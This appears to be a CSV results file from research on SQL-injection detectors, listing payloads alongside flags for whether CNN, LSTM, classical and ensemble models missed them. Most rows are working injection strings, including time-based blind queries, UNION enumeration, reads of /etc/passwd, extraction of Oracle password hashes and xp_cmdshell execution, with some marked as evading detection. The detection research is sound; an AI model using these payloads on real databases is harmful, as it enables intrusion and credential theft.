,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
12439,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17",1,1,0,0,0,0,0
12440,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#","UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#",1,1,1,1,0,1,0
12441,';waitfor delay '0:0:__TIME__'--,';waitfor delay '0:0:__TIME__'--,1,1,0,0,0,0,0
12442,"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23","',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1,1,0,0,0,0,0
12443,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
12444,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#",1,1,0,0,1,0,0
12445,"')) and 0=benchmark(3000000,MD5(1))%20/*","')) and 0=benchmark(3000000,MD5(1))%20/*",1,1,0,0,0,0,0
12446,SELECT COUNT(*) FROM game;,SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
12447,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",1,1,0,0,0,0,0
12448,"UNION ALL SELECT 1,2,3,4,5,6,7","UNION ALL SELECT 1,2,3,4,5,6,7",1,1,1,0,0,0,0
12449,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22","UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",1,1,1,1,0,1,0
12450,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))",1,1,0,0,1,0,0
12451,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
12452,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,1,1,0,0,1,0,0
12453,' or 'something' = 'some'+'thing',' or 'something' = 'some'+'thing',1,1,0,0,0,0,0
12454,"',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
12455,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
12456,"' union select 1,load_file('/etc/passwd'),1,1,1;","' union select 1,load_file('/etc/passwd'),1,1,1;",1,1,0,0,0,0,0
12457,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
12458,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",1,1,1,0,0,0,0
12459,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",1,1,0,0,0,0,0
12460,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
12461,1 and 1=1,1 and 1=1,0,1,0,0,0,0,0
12462,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--",1,1,0,0,1,0,0
12463,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",1,1,0,0,0,0,0
12464,' and 1 in (select var from temp)--,' and 1 in (select var from temp)--,1,1,0,0,0,0,0
12465,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
12466,'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,1,1,0,0,0,0,0
12467,AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,1,1,0,0,1,0,0
12468,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*",1,1,0,0,0,0,0
12469,SELECT COUNT(*) FROM game;,SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
12470,) union select * from information_schema.tables;,) union select * from information_schema.tables;,1,1,0,0,0,0,0
12471,' having 1=1--,' having 1=1--,1,1,0,0,0,0,0
12472,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",1,1,0,0,0,0,0
12473,"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--","'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
12474,"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23","'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1,1,0,0,0,0,0
12475,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
12476,') or ('a'='a,') or ('a'='a,1,1,0,0,0,0,0
12477,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",1,1,0,0,0,0,0
12478,"""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",0,1,0,0,0,0,0
12479,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",1,1,0,0,0,0,0
12480,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",1,1,0,0,0,0,0
12481,SELECT COUNT(*) FROM game;,SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
12482,"insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123'))","insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123'))",1,1,0,0,0,0,0
12483,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
12484,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --","1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",1,1,0,0,0,0,0
12485,""" or isNULL(1/0) /*",""" or isNULL(1/0) /*",0,1,0,0,0,0,0
12486,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#",1,1,1,0,0,0,0
12487,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
12488,"),NULL)%20waitfor%20delay%20'0:0:20'%20/*","),NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
12489,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
12490,""",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",""",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",0,1,0,0,0,0,0
12491,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--",1,1,0,0,0,0,0
12492,"ORDER BY 1,SLEEP(5),3--","ORDER BY 1,SLEEP(5),3--",0,1,1,0,0,0,0
12493,""")))) waitfor delay '0:0:20' --",""")))) waitfor delay '0:0:20' --",0,1,0,0,0,0,0
12494,"""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",0,1,0,0,0,0,0
12495,' or sleep(__TIME__)=',' or sleep(__TIME__)=',1,1,0,0,0,0,0
12496,waitfor delay '00:00:05'#,waitfor delay '00:00:05'#,1,1,1,1,0,1,0
12497,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",1,1,0,0,0,0,0
12498,"UNION SELECT @@VERSION,SLEEP(5),USER(),4#","UNION SELECT @@VERSION,SLEEP(5),USER(),4#",1,1,1,1,0,1,0
12499,"))) and 0=benchmark(3000000,MD5(1))%20--","))) and 0=benchmark(3000000,MD5(1))%20--",0,1,0,0,0,0,0
12500,ORDER BY 15#,ORDER BY 15#,0,1,1,1,0,1,0
12501,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,1,1,0,0,0,0,0
12502,ORDER BY 23,ORDER BY 23,0,1,1,1,0,1,0
12503,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23","+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",0,1,0,0,0,0,0
12504,SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country;,1,0,1,1,1,1,1
12505,1) or sleep(__TIME__)#,1) or sleep(__TIME__)#,0,1,0,0,0,0,0
12506,""",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",""",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",0,1,0,0,0,0,0
12507,' or sleep(__TIME__)#,' or sleep(__TIME__)#,1,1,0,0,0,0,0
12508,""")%20waitfor%20delay%20'0:0:20'%20/*",""")%20waitfor%20delay%20'0:0:20'%20/*",0,1,0,0,0,0,0
12509,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#","UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#",1,1,1,1,0,1,0
12510,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7",1,1,0,0,0,0,0
12511,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",1,1,0,0,0,0,0
12512,' -- &password=,' -- &password=,1,1,1,0,0,0,0
12513,' having 1=1--,' having 1=1--,1,1,0,0,0,0,0
12514,')%20waitfor%20delay%20'0:0:20'%20--,')%20waitfor%20delay%20'0:0:20'%20--,1,1,0,0,0,0,0
12515,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
12516,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
12517,) waitfor delay '0:0:20' --,) waitfor delay '0:0:20' --,1,1,0,0,0,0,0
12518,""")))) and 0=benchmark(3000000,MD5(1))%20/*",""")))) and 0=benchmark(3000000,MD5(1))%20/*",0,1,0,0,0,0,0
12519,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",1,1,1,0,0,0,0
12520,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",1,1,0,0,0,0,0
12521,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
12522,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
12523,"',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
12524,' having 1=1--,' having 1=1--,1,1,0,0,0,0,0
12525,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",1,1,0,0,0,0,0
12526,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",1,1,1,0,0,0,0
12527,SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country;,1,0,1,1,1,1,1
12528,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
12529,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",1,1,1,0,0,0,0
12530,waitfor delay '00:00:05'--,waitfor delay '00:00:05'--,1,1,1,1,0,1,0
12531,(SELECT * FROM (SELECT(SLEEP(5)))ecMj),(SELECT * FROM (SELECT(SLEEP(5)))ecMj),1,1,0,0,1,0,0
12532,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
12533,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,1,1,0,0,0,0,0
12534,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",1,1,1,0,0,0,0
12535,' --,' --,1,1,1,1,0,1,0
12536,"',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
12537,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--","+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",0,1,0,0,0,0,0
12538,"""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",0,1,0,0,0,0,0
12539,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23","""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",0,1,0,0,0,0,0
12540,"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--","UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1,1,1,1,0,1,0
12541,SELECT COUNT(*) FROM game;,SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
12542,SELECT COUNT(*) FROM game;,SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
12543,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",1,1,1,0,0,0,0
12544,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
12545,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#",1,1,1,0,0,0,0
12546,'))%20waitfor%20delay%20'0:0:20'%20--,'))%20waitfor%20delay%20'0:0:20'%20--,1,1,0,0,0,0,0
12547,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*","""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",0,1,0,0,0,0,0
12548,' or 'unusual' = 'unusual',' or 'unusual' = 'unusual',1,1,0,0,0,0,0
12549,"and 0=benchmark(3000000,MD5(1))%20/*","and 0=benchmark(3000000,MD5(1))%20/*",0,1,0,0,0,0,0
12550,'))%20waitfor%20delay%20'0:0:20'%20--,'))%20waitfor%20delay%20'0:0:20'%20--,1,1,0,0,0,0,0
12551,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*","+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",0,1,0,0,0,0,0
12552,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
12553,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
12554,SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country;,1,0,1,1,1,1,1
12555,))%20waitfor%20delay%20'0:0:20'%20--,))%20waitfor%20delay%20'0:0:20'%20--,1,1,0,0,0,0,0
12556,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
12557,'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,1,1,0,0,0,0,0
12558,"')))) and 0=benchmark(3000000,MD5(1))%20/*","')))) and 0=benchmark(3000000,MD5(1))%20/*",1,1,0,0,0,0,0
12559,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
12560,""" or isNULL(1/0) /*",""" or isNULL(1/0) /*",0,1,0,0,0,0,0
12561,"' or benchmark(10000000,MD5(1))#","' or benchmark(10000000,MD5(1))#",1,1,0,0,0,0,0
12562,SELECT COUNT(*) FROM game;,SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
12563,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,1,0,0,0,0,0
12564,""")))))) waitfor delay '0:0:20' /*",""")))))) waitfor delay '0:0:20' /*",0,1,0,0,0,0,0
12565,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10",1,1,1,0,0,0,0
12566,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i",1,1,0,0,1,0,0
12567,"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
12568,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
12569,""",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",""",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",0,1,0,0,0,0,0
12570,ORDER BY 8,ORDER BY 8,0,1,1,1,0,1,0
12571,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",1,1,1,0,0,0,0
12572,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
12573,"')) and 0=benchmark(3000000,MD5(1))%20%23","')) and 0=benchmark(3000000,MD5(1))%20%23",1,1,0,0,0,0,0
12574,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
12575,AS INJECTX WHERE 1=1 AND 1=0--,AS INJECTX WHERE 1=1 AND 1=0--,0,1,1,0,0,0,0
12576,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*","""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",0,1,0,0,0,0,0
12577,'; exec master..xp_cmdshell 'ping 10.10.1.2'--,'; exec master..xp_cmdshell 'ping 10.10.1.2'--,1,1,1,1,0,1,0
12578,"+benchmark(3200,SHA1(1))+'","+benchmark(3200,SHA1(1))+'",1,1,0,0,0,0,0
12579,") and 0=benchmark(3000000,MD5(1))%20%23",") and 0=benchmark(3000000,MD5(1))%20%23",0,1,0,0,0,0,0
12580,' or 'text' = n'text',' or 'text' = n'text',1,1,0,0,0,0,0
12581,ORDER BY 1,ORDER BY 1,0,1,1,1,0,1,0
12582,SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country;,1,0,1,1,1,1,1
12583,' select name from syscolumns where id = (select id from sysobjects where name = tablename')--,' select name from syscolumns where id = (select id from sysobjects where name = tablename')--,1,1,0,0,0,0,0
12584,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",1,1,0,0,0,0,0
12585,'; exec ('sel' + 'ect us' + 'er'),'; exec ('sel' + 'ect us' + 'er'),1,1,1,0,0,0,0
